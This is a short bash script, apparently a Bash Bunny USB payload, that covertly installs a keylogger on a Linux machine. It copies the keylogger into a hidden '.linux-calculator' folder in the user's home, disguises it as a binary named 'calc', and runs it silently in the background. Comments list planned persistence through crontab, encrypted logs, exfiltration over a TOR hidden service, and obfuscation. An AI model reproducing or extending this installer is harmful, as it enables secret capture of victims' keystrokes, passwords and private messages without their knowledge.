#!bin/bash
# hide in plain site
INSTALL_DIR="/home/$USER/.linux-calculator"
BIN_NAME="calc"
SWITCH=switch1

# copy the keylogger from the BashBunny to the $INSTALL_DIR
mkdir -p "$INSTALL_DIR"
cp "/media/$USER/BashBunny/payloads/$SWITCH/keylogger" "$INSTALL_DIR/"
mv "$INSTALL_DIR/keylogger" "$INSTALL_DIR/$BIN_NAME"
chmod +x "$INSTALL_DIR/$BIN_NAME" # make sure the bin has the right permissions 

# run the logger in the background
exec "$INSTALL_DIR/$BIN_NAME" &>/dev/null &
# exec python "$INSTALL_DIR/$BIN_NAME" &>/dev/null &

# TODO: Add to startup scripts/crontab
# TODO: Encrypted logs
# TODO: Exfiltration through TOR hidden service
# TODO: Compile .py for obfiscation
# TODO: Bundle python deps into single executable
